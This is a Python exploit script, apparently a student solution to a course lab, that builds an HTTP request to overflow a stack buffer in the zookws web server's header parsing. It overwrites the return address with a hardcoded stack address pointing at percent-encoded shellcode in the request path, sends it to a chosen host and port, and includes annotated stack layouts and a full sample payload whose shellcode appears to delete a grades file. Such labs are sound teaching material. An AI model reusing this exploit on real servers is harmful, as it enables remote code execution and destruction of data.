#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct
import os

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just

# &reqpath[1] for the "/"
reqpath_shellcode = 0x7fffffffdce1

envvar_addr = 0x7fffffffd890
httpheader_rip = 0x7fffffffdcc8

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytes(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##      ex. turn "\xe1\xdc\xff\xff\xff\x7f" to "%xe1%xdc%xff%xff%xff%x7f" to pass bytes as URLs as HTTP calls
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x
    ##      ex. turn (64-bit int) 0x7fffffffdce1 to (8-byte binary) "\xe1\xdc\xff\xff\xff\x7f\000\000"
    
    ## INJECTED CODE
    # 1. Read shellcode.bin (created from shellcode.S)
    shellfile = open("shellcode.bin", "rb")
    s = shellfile.read()    # returns string of the bytes from .bin

    # 2. Prepare for HTTP request (turn 8-byte binary to percent-encoded)
    shellcode = urllib.parse.quote_from_bytes(s).encode('ascii')

    # 3. Populate request URL with shellcode
    # - must start with "/"
    reqpath = b"/" + \
            shellcode
    print("reqpath: %s", reqpath)
    
    ## BUFFER OVERFLOW
    ## Request: GET /{shellcode_byte_%encoded} HTTP/1.0 \n{header_name_padding}{&reqpath-2bytes}: foo bar\r\n\r\n 
    #  Overflow http_request_headers frame line:166
    #       sprintf(envvar, "HTTP_%s", buf);
    #    - overflow envvar[512] with contents of buf[8192]
    #    - buf gets populated with header with [envvar]: foo bar
    #                                       ex   Cookie: foo bar
    #    - envvar gets populated with "HTTP_{buf}"
    
    # 1. Create padding for header parameter name {header_name_padding}
    #       - minus len("HTTP_")
    header_name = b"A"*((httpheader_rip - envvar_addr) - len("HTTP_")) 
    
    # 2. Replace http_request_headers return address (%rip) 
    #    with shellcode in reqpath on buffer (64-bit int -> 8 byte binary)
    b_reqpath_shellcode = struct.pack("<Q", reqpath_shellcode)
    # remove 2 bytes from end of \xe1\xdc\xff\xff\xff\x7f\000\000 to remove \000\000 so not adding null-terminator 
    # reference: https://thesquareplanet.com/blog/smashing-the-stack-21st-century/#zeroes-in-addresses
    header_name += b_reqpath_shellcode[:-2]
    
    req =   b"GET " + reqpath + \
            b" HTTP/1.0 \n" + \
            header_name + b": foo bar" + \
            b"\r\n\r\n"

    # Example request with Header
    # req = b"GET / HTTP/1.0 \nCookie: foo bar\r\n" + b"\r\n"

    return req

    ## Stack: http_request_headers
    ## 0x7fffffffd890 |         | &envvar[0-7]
    ## ...
    ## 0x7fffffffda90 |         | &value[0-7]
    ## ...
    ## 0x7fffffffdc88 |         | &value[504-511]
    ## ... 8 bytes of ???
    ## 0x7fffffffdc98 | +8      | &colon (char *)
    ## 0x7fffffffdca0 | +8      | &sp (char *) - added to buffer before use
    ## 0x7fffffffdca8 | +4      | padding? - 0x557580a1
    ## 0x7fffffffdcac | +4      | &i (int)
    ## 0x7fffffffdcb0 | +8      | padding? - 0x5575a044
    ## 0x7fffffffdcb8 | +8      | %rbx - don't know why - 0
    ## 0x7fffffffdcc0 | +8      | http_request_headers's %rbp
    ## 0x7fffffffdcc8 | +8      | http_request_headers's %rip return address
    ## ========================================================
    ## 0x7fffffffdce0 | -1      | reqpath[0-7]
    ## 0x7fffffffdce1 |         | shellcode.bin 8-byte percent encoded
    ## 0x7fffffffece0 | +4096   | reqpath[4088-4095]
    ## 0x7fffffffece8 | +8      | &errmsg [(const char **)]
    ## 0x7fffffffecf0 | +8      | process_client's %rbp
    ## 0x7fffffffecf8 | +8      | process_client's return address (%rip)
    ## QUESTION: why is &errmsg pushed onto stack *before* reqpath?

    ## Request for buffer overflow:
    ## GET /%EB%1CYH%89I%19H1%C0%88A%18%B0WH%89%CF%0F%05H1%C0%B0%3CH1%FF%0F%05%E8%DF%FF%FF%FF/home/student/grades.txt HTTP/1.0 \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe1\xdc\xff\xff\xff\x7f: foo bar\r\n\r\n 

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

